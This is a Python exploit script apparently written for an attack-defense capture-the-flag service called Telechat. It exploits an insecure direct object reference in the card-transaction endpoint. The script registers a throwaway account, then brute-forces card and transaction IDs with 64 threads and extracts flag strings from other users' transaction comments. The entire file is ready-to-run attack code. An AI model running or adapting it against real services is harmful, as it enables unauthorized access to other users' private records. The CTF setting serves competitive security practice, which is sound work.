#!/usr/bin/env python3
"""
Sploit for 2023-service-sibirctf-southparkchat (Telechat).

Vuln: IDOR — GET /api/v1/card/<card_id>/transaction/<tx_id> returns the
full transaction (with `comment` carrying the flag) without verifying
that the requester owns the card. To hit a transaction the (card_id,
tx_id) pair has to actually match the underlying row (the handler still
filters by card linkage); we brute the space.

Usage:
    python sploit.py <url-of-opponent-service>
"""
import random
import re
import string
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

DEFAULT_PORT = 8888
PER_REQUEST_TIMEOUT = 21
TOTAL_BUDGET = 27
WORKERS = 64

# Hard scan bound. Each checker put creates ~2 cards, so a service with
# ~340 flags has ~700 cards. Probe up to ~1200 just to be safe.
MAX_CARD_ID = 1200
# Per card, how many tx_ids to try. tx_id is global, growing roughly with
# the flag counter — same upper bound covers all of them.
MAX_TX_ID = 600

FLAG_PATTERNS = [
    re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.I),
    re.compile(r"[A-Z0-9]{31}="),
]


def log(msg):
    print(msg, file=sys.stderr, flush=True)


def normalize(url: str) -> str:
    if "://" not in url:
        url = "http://" + url
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or url
    port = parsed.port or DEFAULT_PORT
    return f"http://{host}:{port}"


def rand_str(n=16, alphabet=string.ascii_letters + string.digits):
    return "".join(random.choice(alphabet) for _ in range(n))


def safe_json(resp):
    try:
        return resp.json()
    except Exception:
        return None


def authed_session(base):
    s = requests.Session()
    s.headers["Connection"] = "keep-alive"
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=WORKERS, pool_maxsize=WORKERS, max_retries=0
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    login = rand_str(24)
    password = rand_str(24)
    try:
        s.post(
            f"{base}/api/v1/register",
            json={
                "login": login,
                "password": password,
                "first_name": rand_str(6, string.ascii_letters),
                "second_name": rand_str(6, string.ascii_letters),
            },
            timeout=PER_REQUEST_TIMEOUT,
        )
    except requests.RequestException as e:
        log(f"[!] register failed: {e}")
    try:
        r = s.post(
            f"{base}/api/v1/login",
            json={"login": login, "password": password},
            timeout=PER_REQUEST_TIMEOUT,
        )
        cookies = requests.utils.cookiejar_from_dict(r.cookies.get_dict())
        s.cookies.update(cookies)
    except requests.RequestException as e:
        log(f"[!] login failed: {e}")
    return s


def fetch(base, sess, card_id, tx_id):
    try:
        r = sess.get(
            f"{base}/api/v1/card/{card_id}/transaction/{tx_id}",
            timeout=PER_REQUEST_TIMEOUT,
        )
    except requests.RequestException:
        return None
    if r.status_code != 200 or not r.content:
        return None
    body = safe_json(r)
    if isinstance(body, dict) and body:
        return body
    return None


def looks_like_flag(s: str) -> bool:
    return any(p.search(s) for p in FLAG_PATTERNS)


def emit(text, printed):
    for pat in FLAG_PATTERNS:
        for hit in pat.findall(text):
            if hit in printed:
                continue
            printed.add(hit)
            print(hit, flush=True)


def candidate_pairs():
    """Generator of (card_id, tx_id) pairs ordered roughly by likelihood.

    Empirically each `put_flag` creates a transaction whose tx_id ≈ flag
    index and whose sender card_id ≈ 2*tx_id. We probe a window around
    that linear estimate, plus a small low-tx_id fallback per card.
    """
    seen = set()

    # 1) low tx_ids per card — cheap, catches small offsets and weirdness
    for cid in range(1, MAX_CARD_ID + 1):
        for tx in range(1, 6):
            key = (cid, tx)
            if key in seen:
                continue
            seen.add(key)
            yield key

    # 2) linear-relation probes around tx ≈ cid/2
    for cid in range(1, MAX_CARD_ID + 1):
        center = max(1, cid // 2)
        for delta in (-3, -2, -1, 0, 1, 2, 3):
            tx = center + delta
            if tx < 1 or tx > MAX_TX_ID:
                continue
            key = (cid, tx)
            if key in seen:
                continue
            seen.add(key)
            yield key


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url>", file=sys.stderr)
        sys.exit(1)

    deadline = time.monotonic() + TOTAL_BUDGET
    base = normalize(sys.argv[1])
    sess = authed_session(base)

    found = set()
    printed = set()
    sample_hits = []

    def work(pair):
        cid, tx_id = pair
        body = fetch(base, sess, cid, tx_id)
        if not isinstance(body, dict):
            return
        comment = body.get("comment")
        if not isinstance(comment, str):
            return
        if comment in found:
            return
        found.add(comment)
        if looks_like_flag(comment):
            if len(sample_hits) < 5:
                sample_hits.append((cid, tx_id, comment))
            emit(comment, printed)

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = []
        try:
            for pair in candidate_pairs():
                if time.monotonic() > deadline:
                    break
                futures.append(pool.submit(work, pair))
                # bound the in-flight queue so cancellation can take effect
                if len(futures) >= WORKERS * 20:
                    for f in as_completed(futures):
                        if time.monotonic() > deadline:
                            break
                        f.result()
                    futures = [f for f in futures if not f.done()]
            for f in as_completed(futures):
                if time.monotonic() > deadline:
                    break
                f.result()
        finally:
            for f in futures:
                f.cancel()

    for cid, tx_id, comment in sample_hits:
        log(f"[hit] card_id={cid} tx_id={tx_id} comment={comment[:60]}")
    log(f"[summary] target={base} flags={len(printed)} comments={len(found)}")


if __name__ == "__main__":
    main()
